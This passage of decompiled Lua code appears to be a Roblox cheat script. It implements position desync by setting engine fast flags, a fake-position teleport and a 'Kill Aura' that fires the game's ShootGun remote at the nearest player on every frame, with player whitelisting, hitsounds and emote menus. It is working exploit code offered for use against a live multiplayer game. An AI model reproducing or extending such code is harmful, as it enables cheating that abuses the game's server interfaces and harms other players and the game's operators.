							flyDir = flyDir - camCF.RightVector
						end
						if Services.UserInputService:IsKeyDown(Enum.KeyCode.D) then
							moveDir = moveDir + camCF.RightVector
							flyDir = flyDir + camCF.RightVector
						end
					end
					if not IsChatFocused() then
						if Services.UserInputService:IsKeyDown(Enum.KeyCode.Space) then
							verticalDir = 1
						elseif Services.UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
							verticalDir = -1
						end
					end
					moveDir = Vector3.new(moveDir.X, 0, moveDir.Z)
					flyDir = Vector3.new(flyDir.X, 0, flyDir.Z)
					if viewMode ~= "FakeClone" then
						local v885 = 300
						local v886 = Vector3.new(0, 0, 0)
						if flyDir.Magnitude > 0 then
							v886 = v886 + flyDir.Unit * v885 * delta
						end
						if verticalDir ~= 0 then
							v886 = v886 + Vector3.new(0, verticalDir * v885 * delta, 0)
						end
						if v886.Magnitude > 0 then
							workspace.CurrentCamera.CFrame = workspace.CurrentCamera.CFrame + v886
						end
					else
						humanoidClone = Clone.Humanoid
						if v_u_742 or (v_u_743 or v_u_744) then
							isJumping = humanoidClone:GetState() == Enum.HumanoidStateType.Jumping
							if humanoidClone.FloorMaterial == Enum.Material.Air or isJumping then
								cloneHRP.Anchored = false
								humanoidClone.PlatformStand = false
								humanoidClone.Jump = false
								humanoidClone:Move(Char.Humanoid.MoveDirection, false)
								if moveDir.Magnitude > 0 then
									speedStep = moveDir.Unit * v_u_745 * delta
									if v_u_742 then
										cloneHRP.CFrame = cloneHRP.CFrame + speedStep
									elseif v_u_743 then
										cloneHRP.Velocity = Vector3.new(moveDir.Unit.X * v_u_745, cloneHRP.Velocity.Y, moveDir.Unit.Z * v_u_745)
										local v887 = math.clamp(v_u_745 / 16, 1, 10)
										local v888, v889, v890 = pairs(Clone.Humanoid:GetPlayingAnimationTracks())
										while true do
											local v891
											v890, v891 = v888(v889, v890)
											if v890 == nil then
												break
											end
											v891:AdjustSpeed(v887)
										end
									elseif v_u_744 then
										local v892 = cloneHRP.Anchored
										local v893 = humanoidClone.PlatformStand
										cloneHRP.Anchored = false
										humanoidClone.PlatformStand = false
										cloneHRP:ApplyImpulse(moveDir.Unit * v_u_745 * cloneHRP.AssemblyMass)
										cloneHRP.Anchored = v892
										humanoidClone.PlatformStand = v893
									end
								end
							elseif moveDir.Magnitude <= 0 then
								cloneHRP.Anchored = true
								humanoidClone.PlatformStand = true
								humanoidClone.Jump = false
								if v_u_743 then
									cloneHRP.Velocity = Vector3.zero
								end
							else
								cloneHRP.Anchored = true
								humanoidClone.PlatformStand = true
								humanoidClone.Jump = false
								speedStep = moveDir.Unit * v_u_745 * delta
								if v_u_742 then
									cloneHRP.CFrame = cloneHRP.CFrame + speedStep
								elseif v_u_743 then
									cloneHRP.Velocity = Vector3.new(moveDir.Unit.X * v_u_745, cloneHRP.Velocity.Y, moveDir.Unit.Z * v_u_745)
									local v894 = math.clamp(v_u_745 / 16, 1, 10)
									local v895, v896, v897 = pairs(Clone.Humanoid:GetPlayingAnimationTracks())
									while true do
										local v898
										v897, v898 = v895(v896, v897)
										if v897 == nil then
											break
										end
										v898:AdjustSpeed(v894)
									end
								elseif v_u_744 then
									local v899 = cloneHRP.Anchored
									local v900 = humanoidClone.PlatformStand
									cloneHRP.Anchored = false
									humanoidClone.PlatformStand = false
									cloneHRP:ApplyImpulse(moveDir.Unit * v_u_745 * cloneHRP.AssemblyMass)
									cloneHRP.Anchored = v899
									humanoidClone.PlatformStand = v900
								end
							end
						else
							cloneHRP.Anchored = false
							humanoidClone.PlatformStand = false
							humanoidClone.Jump = false
							humanoidClone:Move(Char.Humanoid.MoveDirection, false)
						end
						if v_u_748 or (v_u_749 or v_u_750) then
							local v901 = Vector3.zero
							humanoidClone.PlatformStand = true
							if v_u_752 == "Classic" or v_u_750 then
								cloneHRP.Anchored = false
								if not IsChatFocused() then
									if v_u_561:IsKeyDown(Enum.KeyCode.W) then
										v901 = v901 + camCF.LookVector
									end
									if v_u_561:IsKeyDown(Enum.KeyCode.S) then
										v901 = v901 - camCF.LookVector
									end
									if v_u_561:IsKeyDown(Enum.KeyCode.A) then
										v901 = v901 - camCF.RightVector
									end
									if v_u_561:IsKeyDown(Enum.KeyCode.D) then
										v901 = v901 + camCF.RightVector
									end
								end
								if v901.Magnitude > 0 then
									local v902 = v901.Unit * v_u_751 * delta
									cloneHRP.CFrame = CFrame.new(cloneHRP.Position + v902, cloneHRP.Position + v902 + Vector3.new(0, 0, 1))
								end
								cloneHRP.Velocity = Vector3.zero
								cloneHRP.RotVelocity = Vector3.zero
							else
								if flyDir.Magnitude > 0 then
									v901 = flyDir.Unit * v_u_751 * delta
								end
								local v903 = verticalDir * v_u_751 * delta
								local v904 = Vector3.new(v901.X, v903, v901.Z)
								cloneHRP.Anchored = true
								cloneHRP.CFrame = cloneHRP.CFrame + v904
							end
						end
						if Toggles.UnderMapMode.Value then
							cloneHRP.CFrame = CFrame.new(cloneHRP.Position.X, -25, cloneHRP.Position.Z)
							cloneHRP.Velocity = Vector3.new((math.random() - 0.5) * 2 * underMapSpeed, 0, (math.random() - 0.5) * 2 * underMapSpeed)
						end
						Clone.Humanoid.Jump = Char.Humanoid.Jump
						AnimCheck(Clone.Humanoid, Char.Humanoid.MoveDirection)
					end
				end
			end
		end)
	end
end
function disableDesync()
	if desyncEnabled then
		desyncEnabled = false
		if desyncThread then
			desyncThread:Disconnect()
			desyncThread = nil
		end
		if Clone and Clone:FindFirstChild("HumanoidRootPart") then
			Clone.HumanoidRootPart.Anchored = false
			Clone.Humanoid.PlatformStand = false
		end
		if Clone and (Clone:FindFirstChild("HumanoidRootPart") and hrp) then
			if viewMode ~= "FakeClone" then
				hrp.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position)
			else
				hrp.CFrame = Clone.HumanoidRootPart.CFrame
			end
			workspace.CurrentCamera.CameraSubject = humanoid
			workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
			Clone:Destroy()
			Clone = nil
		end
		if hrp and humanoid then
			hrp.Anchored = true
			enableAntiFling()
			humanoid:ChangeState(Enum.HumanoidStateType.Physics)
			task.delay(0.01, function()
				if hrp and hrp.Parent then
					hrp.Anchored = false
					disableAntiFling()
					humanoid.PlatformStand = false
					humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
				end
			end)
		end
	end
end
local function v907(p905)
	character = p905
	hrp = p905:WaitForChild("HumanoidRootPart")
	humanoid = p905:WaitForChild("Humanoid")
	lastHealth = humanoid.Health
	humanoid.HealthChanged:Connect(function(p906)
		if autoDesyncOnDamage and (p906 < lastHealth and Toggles.EnablePosDesync.Value) then
			enableDesync()
		end
		lastHealth = p906
	end)
end
if Services.LocalPlayer.Character then
	v907(Services.LocalPlayer.Character)
end
Services.LocalPlayer.CharacterAdded:Connect(v907)
Tab1:AddToggle("EnablePosDesync", {
	["Text"] = "Enable",
	["Default"] = false
}):AddKeyPicker("DesyncToggleBind", {
	["Default"] = "",
	["Mode"] = "Toggle",
	["Text"] = "Pos Desync",
	["SyncToggleState"] = false,
	["Callback"] = function(p908)
		if not IsChatFocused() and Toggles.EnablePosDesync.Value then
			if p908 then
				enableDesync()
			else
				disableDesync()
			end
		end
	end
}):OnChanged(function(p909)
	if p909 then
		enableDesync()
	else
		disableDesync()
	end
end)
Tab1:AddToggle("AutoDesyncOnDamage", {
	["Text"] = "Auto On Damage",
	["Default"] = false,
	["Callback"] = function(p910)
		autoDesyncOnDamage = p910
		if p910 then
			local v_u_911 = workspace.FallenPartsDestroyHeight
			workspace.FallenPartsDestroyHeight = -math.huge
			task.delay(3, function()
				-- upvalues: (ref) v_u_911
				workspace.FallenPartsDestroyHeight = v_u_911
			end)
			local v_u_912 = Services.LocalPlayer.Character
			if v_u_912 and v_u_912:FindFirstChild("HumanoidRootPart") then
				v_u_912.HumanoidRootPart.CFrame = CFrame.new(v_u_912.HumanoidRootPart.Position.X, -49999, v_u_912.HumanoidRootPart.Position.Z)
				task.delay(1, function()
					-- upvalues: (ref) v_u_912
					if v_u_912:FindFirstChild("Head") then
						v_u_912.Head:Destroy()
					end
					Services.LocalPlayer:LoadCharacter()
				end)
			end
		end
	end
})
Tab1:AddToggle("UnderMapMode", {
	["Text"] = "Pause Resolver",
	["Default"] = false
})
Tab1:AddDropdown("DesyncVersion", {
	["Text"] = "Desync Version",
	["Default"] = "Custom",
	["Values"] = {
		"Custom",
		"Random",
		"Version 1",
		"Version 2",
		"Silent Version",
		"Extreme Version",
		"Ultimate Version"
	},
	["Callback"] = function(p913)
		if p913 == "Random" then
			randomMode = true
		else
			randomMode = false
			desyncMode = p913
		end
	end
})
Tab1:AddDropdown("ViewMode", {
	["Text"] = "Desync Mode",
	["Default"] = "FakeClone",
	["Values"] = { "FakeClone", "FreeCam" },
	["Callback"] = function(p914)
		viewMode = p914
		if desyncEnabled and Clone then
			if p914 == "FreeCam" then
				workspace.Camera.CameraSubject = workspace.Camera
				workspace.Camera.CameraType = Enum.CameraType.Scriptable
				local v915, v916, v917 = ipairs(Clone:GetDescendants())
				while true do
					local v918
					v917, v918 = v915(v916, v917)
					if v917 == nil then
						break
					end
					if v918:IsA("BasePart") or (v918:IsA("Decal") or (v918:IsA("Texture") or v918:IsA("Face"))) then
						v918.Transparency = 1
					end
				end
			else
				workspace.Camera.CameraSubject = Clone.Humanoid
				workspace.Camera.CameraType = Enum.CameraType.Custom
				local v919, v920, v921 = ipairs(Clone:GetDescendants())
				while true do
					local v922
					v921, v922 = v919(v920, v921)
					if v921 == nil then
						break
					end
					if v922:IsA("BasePart") and v922.Name ~= "HumanoidRootPart" then
						v922.Transparency = 0
					end
					if v922:IsA("Decal") or (v922:IsA("Texture") or v922:IsA("Face")) then
						v922.Transparency = 0
					end
				end
			end
		end
	end
})
Tab1:AddInput("CustomXInput", {
	["Default"] = "1000",
	["Numeric"] = true,
	["Finished"] = true,
	["Text"] = "Custom X",
	["Callback"] = function(p923)
		local v924 = tonumber(p923)
		if v924 then
			customPos = Vector3.new(v924, customPos.Y, customPos.Z)
		end
	end
})
Tab1:AddInput("CustomYInput", {
	["Default"] = "1000",
	["Numeric"] = true,
	["Finished"] = true,
	["Text"] = "Custom Y",
	["Callback"] = function(p925)
		local v926 = tonumber(p925)
		if v926 then
			customPos = Vector3.new(customPos.X, v926, customPos.Z)
		end
	end
})
Tab1:AddInput("CustomZInput", {
	["Default"] = "1000",
	["Numeric"] = true,
	["Finished"] = true,
	["Text"] = "Custom Z",
	["Callback"] = function(p927)
		local v928 = tonumber(p927)
		if v928 then
			customPos = Vector3.new(customPos.X, customPos.Y, v928)
		end
	end
})
local v_u_929 = false
local v_u_930 = workspace.FallenPartsDestroyHeight
local v_u_931 = "Custom"
local v_u_932 = {
	["X"] = 500,
	["Y"] = 500,
	["Z"] = 500
}
local v_u_933 = nil
local v_u_934 = "Voidless"
local v_u_935 = "Default"
local v_u_936 = 0.5
local function v_u_937()
	return (game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()):FindFirstChild("HumanoidRootPart")
end
local function v_u_938()
	-- upvalues: (ref) v_u_931
	return v_u_931 == "Version 1" and 100000 or (v_u_931 == "Version 2" and 5000000 or (v_u_931 == "Version 3" and 10000000 or (v_u_931 ~= "Custom" and 100000 or nil)))
end
local function v_u_940()
	-- upvalues: (ref) v_u_931, (ref) v_u_932, (ref) v_u_938
	if v_u_931 == "Custom" then
		return CFrame.new(v_u_932.X, v_u_932.Y, v_u_932.Z)
	end
	local v939 = v_u_938()
	return CFrame.new(v939, v939, v939)
end
local function v_u_941(_)
	-- upvalues: (ref) v_u_935
	if v_u_935 == "Default" or v_u_935 == "Advanced" then
		pcall(function()
			getgenv().Desync = true
			setfflag("NextGenReplicatorEnabledWrite4", "True")
		end)
	end
end
local function v_u_942()
	pcall(function()
		getgenv().Desync = false
		setfflag("NextGenReplicatorEnabledWrite4", "False")
	end)
end
local function v_u_945()
	-- upvalues: (ref) v_u_929, (ref) v_u_937, (ref) v_u_933, (ref) v_u_941, (ref) v_u_934, (ref) v_u_940, (ref) v_u_936
	if v_u_929 then
		return
	else
		v_u_929 = true
		local v_u_943 = v_u_937()
		if v_u_943 then
			v_u_933 = v_u_943.CFrame
			workspace.FallenPartsDestroyHeight = -math.huge
			v_u_941(v_u_943)
			if v_u_934 == "Voidless" then
				local v944 = v_u_940()
				if v944 then
					v_u_943.CFrame = v944
				end
				task.spawn(function()
					-- upvalues: (ref) v_u_936, (ref) v_u_943, (ref) v_u_933
					task.wait(v_u_936)
					if v_u_943 and v_u_933 then
						v_u_943.CFrame = v_u_933
					end
				end)
			end
		end
	end
end
local function v_u_946()
	-- upvalues: (ref) v_u_929, (ref) v_u_930, (ref) v_u_942
	v_u_929 = false
	workspace.FallenPartsDestroyHeight = v_u_930
	v_u_942()
end
Tab2:AddToggle("EnableFakePos", {
	["Text"] = "Enable",
	["Default"] = false
}):AddKeyPicker("FakePosBind", {
	["Default"] = "",
	["Mode"] = "Toggle",
	["Text"] = "Fake Position",
	["NoUI"] = false,
	["SyncToggleState"] = false,
	["Callback"] = function(p947)
		-- upvalues: (ref) v_u_945, (ref) v_u_946
		if game:GetService("UserInputService"):GetFocusedTextBox() then
			return
		elseif Toggles.EnableFakePos.Value then
			if p947 then
				v_u_945()
			else
				v_u_946()
			end
		end
	end
}):OnChanged(function(p948)
	-- upvalues: (ref) v_u_945, (ref) v_u_946
	if not game:GetService("UserInputService"):GetFocusedTextBox() then
		if p948 then
			v_u_945()
		else
			v_u_946()
		end
	end
end)
Tab2:AddDropdown("PositionVersion", {
	["Text"] = "FakePos Version",
	["Default"] = "Custom",
	["Values"] = {
		"Custom",
		"Version 1",
		"Version 2",
		"Version 3"
	}
}):OnChanged(function(p949)
	-- upvalues: (ref) v_u_931
	v_u_931 = p949
end)
Tab2:AddDropdown("FakePosMode", {
	["Text"] = "Mode",
	["Default"] = "Voidless",
	["Values"] = { "Voidless", "On the spot" }
}):OnChanged(function(p950)
	-- upvalues: (ref) v_u_934
	v_u_934 = p950
end)
Tab2:AddDropdown("FakePosMethod", {
	["Text"] = "Method",
	["Default"] = "Default",
	["Values"] = { "Default", "Advanced" }
}):OnChanged(function(p951)
	-- upvalues: (ref) v_u_935
	v_u_935 = p951
end)
Tab2:AddSlider("ReturnCooldown", {
	["Text"] = "Return Cooldown",
	["Default"] = 0.5,
	["Min"] = 0.1,
	["Max"] = 3,
	["Rounding"] = 1
}):OnChanged(function(p952)
	-- upvalues: (ref) v_u_936
	v_u_936 = p952
end)
Tab2:AddInput("CustomX", {
	["Text"] = "Custom X",
	["Numeric"] = true,
	["Placeholder"] = "Enter value"
}):OnChanged(function(p953)
	-- upvalues: (ref) v_u_932
	v_u_932.X = tonumber(p953) or v_u_932.X
end)
Tab2:AddInput("CustomY", {
	["Text"] = "Custom Y",
	["Numeric"] = true,
	["Placeholder"] = "Enter value"
}):OnChanged(function(p954)
	-- upvalues: (ref) v_u_932
	v_u_932.Y = tonumber(p954) or v_u_932.Y
end)
Tab2:AddInput("CustomZ", {
	["Text"] = "Custom Z",
	["Numeric"] = true,
	["Placeholder"] = "Enter value"
}):OnChanged(function(p955)
	-- upvalues: (ref) v_u_932
	v_u_932.Z = tonumber(p955) or v_u_932.Z
end)
Client = v_u_566.LocalPlayer
KillAuraGroup = v22:AddRightGroupbox("Kill Aura")
Table = {
	["Aiming"] = {
		["SilentConfig"] = {
			["Kill_Aura"] = false,
			["Kill_Aura_Range"] = 200
		}
	}
}
Script = {
	["Targeting"] = {
		["Target"] = nil
	},
	["Functions"] = {},
	["Connections"] = {},
	["Drawings"] = {},
	["AuraWhiteList"] = {}
}
hitsounds = {
	["Bubble"] = "rbxassetid://6534947588",
	["Lazer"] = "rbxassetid://130791043",
	["Pick"] = "rbxassetid://1347140027",
	["Pop"] = "rbxassetid://198598793",
	["Rust"] = "rbxassetid://1255040462",
	["Sans"] = "rbxassetid://3188795283",
	["Fart"] = "rbxassetid://130833677",
	["Skeet"] = "rbxassetid://5633695679",
	["Neverlose"] = "rbxassetid://6534948092",
	["Fatality"] = "rbxassetid://6534947869",
	["Minecraft"] = "rbxassetid://5869422451",
	["Gamesense"] = "rbxassetid://4817809188",
	["Crowbar"] = "rbxassetid://546410481",
	["Stone"] = "rbxassetid://3581383408",
	["OldFatality"] = "rbxassetid://6607142036",
	["Laser"] = "rbxassetid://7837461331",
	["CallOfDuty"] = "rbxassetid://5952120301",
	["Bat"] = "rbxassetid://3333907347",
	["TF2Critical"] = "rbxassetid://296102734",
	["Saber"] = "rbxassetid://8415678813",
	["Baimware"] = "rbxassetid://3124331820",
	["Osu"] = "rbxassetid://7149255551",
	["TF2"] = "rbxassetid://2868331684",
	["Slime"] = "rbxassetid://6916371803",
	["AmongUs"] = "rbxassetid://5700183626"
}
hs_enabled = false
hs_selected = "Bubble"
hs_volume = 1
_lastHealth = {}
selectedPlayer = nil
function playHitsound()
	if hs_enabled then
		local v956 = hitsounds[hs_selected]
		if v956 then
			local v_u_957 = Instance.new("Sound")
			v_u_957.SoundId = v956
			v_u_957.Volume = hs_volume
			v_u_957.Parent = workspace
			local v958 = v_u_957
			v_u_957.Play(v958)
			local v_u_959 = nil
			v_u_959 = v_u_957.Ended:Connect(function()
				-- upvalues: (ref) v_u_957, (ref) v_u_959
				v_u_957:Destroy()
				if v_u_959 then
					v_u_959:Disconnect()
				end
			end)
		end
	else
		return
	end
end
function Script.Functions.IsValidTarget(p960)
	if not p960 then
		return false
	end
	local v961 = p960:FindFirstChildOfClass("Humanoid")
	if not v961 or v961.Health <= 0 then
		return false
	end
	if p960:FindFirstChildOfClass("ForceField") then
		return false
	end
	local v962 = p960:FindFirstChild("BodyEffects")
	if v962 then
		local v963 = v962:FindFirstChild("K.O")
		if v963 and (v963:IsA("BoolValue") and v963.Value) then
			return false
		end
	end
	return not p960:FindFirstChild("GRABBING_CONSTRAINT")
end
function Script.Functions.IsAuraWhiteListed(p964)
	return Script.AuraWhiteList[p964.UserId] == true
end
function Script.Functions.ApplyAuraWhiteListVisuals(p965)
	if p965 and p965.Character then
		local v966 = p965.Character
		if not v966:FindFirstChild("AuraWhiteListHighlight") then
			local v967 = Instance.new("Highlight")
			v967.Name = "AuraWhiteListHighlight"
			v967.FillColor = Color3.fromRGB(0, 255, 0)
			v967.OutlineColor = Color3.fromRGB(0, 0, 0)
			v967.FillTransparency = 0.5
			v967.OutlineTransparency = 0
			v967.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
			v967.Parent = v966
		end
		local v968 = v966:FindFirstChild("Head") or v966:FindFirstChildWhichIsA("BasePart")
		if v968 and not v968:FindFirstChild("AuraWhiteListBillboard") then
			local v969 = Instance.new("BillboardGui")
			v969.Name = "AuraWhiteListBillboard"
			v969.Size = UDim2.new(0, 120, 0, 25)
			v969.AlwaysOnTop = true
			v969.StudsOffset = Vector3.new(0, 3, 0)
			v969.Parent = v968
			local v970 = Instance.new("TextLabel")
			v970.Size = UDim2.new(1, 0, 1, 0)
			v970.BackgroundTransparency = 1
			v970.Text = "Whitelisted"
			v970.Font = Enum.Font.GothamBold
			v970.TextSize = 14
			v970.TextColor3 = Color3.fromRGB(0, 255, 0)
			v970.TextStrokeTransparency = 0
			v970.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
			v970.Parent = v969
		end
	end
end
function Script.Functions.RemoveAuraWhiteListVisuals(p971)
	if p971 and p971.Character then
		local v972 = p971.Character
		local v973 = v972:FindFirstChild("AuraWhiteListHighlight")
		if v973 then
			v973:Destroy()
		end
		local v974 = v972:FindFirstChild("Head") or v972:FindFirstChildWhichIsA("BasePart")
		local v975 = v974 and v974:FindFirstChild("AuraWhiteListBillboard")
		if v975 then
			v975:Destroy()
		end
	end
end
function Script.Functions.SetupAuraWhiteListRefresh(p_u_976)
	if p_u_976 then
		if Script.Connections[p_u_976] then
			pcall(function()
				-- upvalues: (ref) p_u_976
				Script.Connections[p_u_976]:Disconnect()
			end)
		end
		Script.Connections[p_u_976] = p_u_976.CharacterAdded:Connect(function()
			-- upvalues: (ref) p_u_976
			task.wait(0.5)
			if Script.Functions.IsAuraWhiteListed(p_u_976) then
				Script.Functions.ApplyAuraWhiteListVisuals(p_u_976)
			end
		end)
	end
end
function Script.Functions.GetClosestPlayer()
	-- upvalues: (ref) v_u_566
	if not (Client.Character and Client.Character:FindFirstChild("HumanoidRootPart")) then
		return nil
	end
	local v977 = Table.Aiming.SilentConfig.Kill_Aura_Range
	local v978 = v_u_566
	local v979, v980, v981 = pairs(v978:GetPlayers())
	local v982 = nil
	while true do
		local v983
		v981, v983 = v979(v980, v981)
		if v981 == nil then
			break
		end
		if v983 ~= Client and v983.Character and (v983.Character:FindFirstChild("HumanoidRootPart") and (not Script.Functions.IsAuraWhiteListed(v983) and Script.Functions.IsValidTarget(v983.Character))) then
			local v984 = (v983.Character.HumanoidRootPart.Position - Client.Character.HumanoidRootPart.Position).Magnitude
			if v984 <= v977 then
				v982 = v983
				v977 = v984
			end
		end
	end
	return v982
end
function Script.Functions.ShootRemote(p985, p986)
	-- upvalues: (ref) v_u_11
	if p985 and (p986 and p986.Character) then
		if p986.Character:FindFirstChild("Head") then
			v_u_11.MainEvent:FireServer("ShootGun", p985:FindFirstChild("Handle"), p985.Handle and p985.Handle.CFrame.Position or p985:GetPrimaryPartCFrame().p, p986.Character.HumanoidRootPart.Position, p986.Character.Head, Vector3.new(0, 0, -1))
			local v987 = p986.Character:FindFirstChildOfClass("Humanoid")
			if v987 then
				if _lastHealth[p986.Name] ~= nil then
					if v987.Health < _lastHealth[p986.Name] then
						playHitsound()
					end
					_lastHealth[p986.Name] = v987.Health
				else
					_lastHealth[p986.Name] = v987.Health
				end
			end
		end
	end
end
function Script.Functions.KillAura()
	local v988 = Script.Functions.GetClosestPlayer()
	if v988 then
		local v989 = Client.Character
		if v989 then
			v989 = Client.Character:FindFirstChildOfClass("Tool")
		end
		if v989 then
			Script.Functions.ShootRemote(v989, v988)
		end
	else
		return
	end
end
v_u_661.Heartbeat:Connect(function()
	if Table.Aiming.SilentConfig.Kill_Aura then
		Script.Functions.KillAura()
	end
end)
function getPlayerNames(p990)
	-- upvalues: (ref) v_u_566
	local v991 = p990 and p990:lower() or nil
	local v992 = v_u_566
	local v993, v994, v995 = ipairs(v992:GetPlayers())
	local v996 = {}
	while true do
		local v997
		v995, v997 = v993(v994, v995)
		if v995 == nil then
			break
		end
		if v997 ~= Client then
			local v998 = v997.Name or ""
			local v999 = v997.DisplayName or ""
			if not v991 or (v998:lower():find(v991) or v999:lower():find(v991)) then
				table.insert(v996, v998)
			end
		end
	end
	table.sort(v996)
	return v996
end
KillAuraToggle = KillAuraGroup:AddToggle("MainToggle", {
	["Text"] = "Enable",
	["Default"] = false,
	["Callback"] = function(p1000)
		Table.Aiming.SilentConfig.Kill_Aura = p1000
	end
})
if KillAuraToggle and type(KillAuraToggle.AddKeyPicker) == "function" then
	KillAuraToggle:AddKeyPicker("Keybind", {
		["Default"] = "",
		["Text"] = "Kill Aura",
		["Mode"] = "Toggle",
		["Callback"] = function(p_u_1001)
			-- upvalues: (ref) v_u_561
			if not v_u_561:GetFocusedTextBox() then
				Table.Aiming.SilentConfig.Kill_Aura = p_u_1001
				if KillAuraToggle.SetValue then
					pcall(function()
						-- upvalues: (ref) p_u_1001
						KillAuraToggle:SetValue(p_u_1001)
					end)
				end
			end
		end
	})
end
KillAuraGroup:AddSlider("KillAuraRange", {
	["Text"] = "Kill Aura Range",
	["Min"] = 10,
	["Max"] = 200,
	["Default"] = Table.Aiming.SilentConfig.Kill_Aura_Range,
	["Rounding"] = 0,
	["Callback"] = function(p1002)
		Table.Aiming.SilentConfig.Kill_Aura_Range = p1002
	end
})
KillAuraGroup:AddToggle("HS_Toggle", {
	["Text"] = "Hitsounds",
	["Default"] = false,
	["Callback"] = function(p1003)
		hs_enabled = p1003
	end
})
KillAuraGroup:AddDropdown("HS_Select", {
	["Text"] = "Select Hitsound",
	["Values"] = (function()
		local v1004, v1005, v1006 = pairs(hitsounds)
		local v1007 = {}
		while true do
			local v1008
			v1006, v1008 = v1004(v1005, v1006)
			if v1006 == nil then
				break
			end
			table.insert(v1007, v1006)
		end
		table.sort(v1007)
		return v1007
	end)(),
	["Default"] = hs_selected,
	["Callback"] = function(p1009)
		hs_selected = p1009
	end
})
KillAuraGroup:AddSlider("HS_Vol", {
	["Text"] = "Volume",
	["Min"] = 0,
	["Max"] = 5,
	["Default"] = hs_volume,
	["Rounding"] = 2,
	["Callback"] = function(p1010)
		hs_volume = p1010
	end
})
playerDropdown = KillAuraGroup:AddDropdown("PlayerDropdown", {
	["Text"] = "Select Player",
	["Values"] = getPlayerNames(),
	["Default"] = getPlayerNames()[1] or "",
	["Multi"] = false,
	["Callback"] = function(p1011)
		Script.Targeting.Target = p1011
		selectedPlayer = p1011
	end
})
KillAuraGroup:AddInput("PlayerSearch", {
	["Text"] = "Search Player",
	["Default"] = "",
	["Placeholder"] = "Enter player name...",
	["Numeric"] = false,
	["Finished"] = true,
	["Callback"] = function(p1012)
		local v1013 = getPlayerNames(p1012)
		if #v1013 > 0 then
			if playerDropdown.SetValues then
				playerDropdown:SetValues(v1013)
			end
			local v1014 = p1012:lower()
			local v1015, v1016, v1017 = ipairs(v1013)
			while true do
				local v1018
				v1017, v1018 = v1015(v1016, v1017)
				if v1017 == nil then
					break
				end
				if v1018:lower() == v1014 then
					if playerDropdown.SetValue then
						playerDropdown:SetValue(v1018)
						Script.Targeting.Target = v1018
						selectedPlayer = v1018
					end
					break
				end
			end
			if #v1013 == 1 and playerDropdown.SetValue then
				playerDropdown:SetValue(v1013[1])
				Script.Targeting.Target = v1013[1]
				selectedPlayer = v1013[1]
			end
		end
	end
})
KillAuraGroup:AddButton("Whitelist", function()
	-- upvalues: (ref) v_u_566
	local v1019 = selectedPlayer
	if v1019 and v1019 ~= "" then
		local v1020 = v_u_566:FindFirstChild(v1019)
		if v1020 then
			Script.AuraWhiteList[v1020.UserId] = true
			Script.Functions.ApplyAuraWhiteListVisuals(v1020)
			Script.Functions.SetupAuraWhiteListRefresh(v1020)
		end
	end
end)
KillAuraGroup:AddButton("Clear Whitelist", function()
	-- upvalues: (ref) v_u_566
	local v1021, v1022, v1023 = pairs(Script.AuraWhiteList)
	while true do
		local v1024
		v1023, v1024 = v1021(v1022, v1023)
		if v1023 == nil then
			break
		end
		Script.AuraWhiteList[v1023] = nil
	end
	local v1025 = v_u_566
	local v1026, v1027, v1028 = ipairs(v1025:GetPlayers())
	while true do
		local v1029
		v1028, v1029 = v1026(v1027, v1028)
		if v1028 == nil then
			break
		end
		Script.Functions.RemoveAuraWhiteListVisuals(v1029)
	end
end)
v_u_566.PlayerAdded:Connect(function(p1030)
	task.wait(0.05)
	local v1031 = getPlayerNames()
	if playerDropdown.SetValues then
		playerDropdown:SetValues(v1031)
	end
	Script.Functions.SetupAuraWhiteListRefresh(p1030)
end)
v_u_566.PlayerRemoving:Connect(function(p1032)
	task.wait(0.05)
	local v1033 = getPlayerNames()
	if playerDropdown.SetValues then
		playerDropdown:SetValues(v1033)
	end
	Script.Functions.RemoveAuraWhiteListVisuals(p1032)
end)
local v1034, v1035, v1036 = pairs(v_u_566:GetPlayers())
local v_u_1037 = v_u_662
local v1038 = v_u_661
local v_u_1039 = v_u_663
while true do
	local v1040
	v1036, v1040 = v1034(v1035, v1036)
	if v1036 == nil then
		break
	end
	Script.Functions.SetupAuraWhiteListRefresh(v1040)
end
if playerDropdown then
	local v1041 = getPlayerNames()
	if v1041[1] and playerDropdown.SetValue then
		playerDropdown:SetValue(v1041[1])
		Script.Targeting.Target = v1041[1]
		selectedPlayer = v1041[1]
	end
end
TabBox = v22:AddRightTabbox()
Tab1 = TabBox:AddTab("Emotes")
Tab2 = TabBox:AddTab("Animations")
DancesStored = {
	["Dances"] = {
		["Floss"] = 10714340543,
		["Hyper Flex"] = 10714369624,
		["Yung Blud"] = 15609995579
	}
}
CurrentDanceTracks = {}
function PlayDance(p1042)
	playerCharacter = player.Character
	if playerCharacter then
		humanoid = playerCharacter:FindFirstChildOfClass("Humanoid")
		if humanoid then
			if DancesStored.Dances[p1042] then
				local v1043, v1044, v1045 = pairs(CurrentDanceTracks)
				while true do
					local v1046
					v1045, v1046 = v1043(v1044, v1045)
					if v1045 == nil then
						break
					end
					if v1046 then
						v1046:Stop()
						v1046:Destroy()
						CurrentDanceTracks[v1045] = nil
						if v1045 ~= p1042 then
							Tab2:SetToggle(v1045 .. "Toggle", false)
						end
					end
				end
				animation = Instance.new("Animation")
				animation.AnimationId = "rbxassetid://" .. tostring(DancesStored.Dances[p1042])
				track = humanoid:LoadAnimation(animation)
				track:Play()
				CurrentDanceTracks[p1042] = track
			end
		else
			return
		end
	else
		return
	end
end
function StopDance(p1047)
	if CurrentDanceTracks[p1047] then
		CurrentDanceTracks[p1047]:Stop()
		CurrentDanceTracks[p1047]:Destroy()
		CurrentDanceTracks[p1047] = nil
	end
end
function AddDanceToggle(p_u_1048, p1049)
	-- upvalues: (ref) v_u_561
	Tab1:AddToggle(p_u_1048 .. "Toggle", {
		["Text"] = p_u_1048,
		["Default"] = false,
		["Callback"] = function(p1050)
			-- upvalues: (ref) p_u_1048
			if p1050 then
				PlayDance(p_u_1048)
			else
				StopDance(p_u_1048)
			end
		end
	}):AddKeyPicker(p1049, {
		["Default"] = "",
		["Mode"] = "Toggle",
		["Text"] = p_u_1048 .. " Dance",
		["NoUI"] = false,
		["SyncToggleState"] = false,
		["Callback"] = function()
			-- upvalues: (ref) v_u_561, (ref) p_u_1048
			if v_u_561:GetFocusedTextBox() then
				return
			elseif Toggles[p_u_1048 .. "Toggle"].Value then
				if CurrentDanceTracks[p_u_1048] then
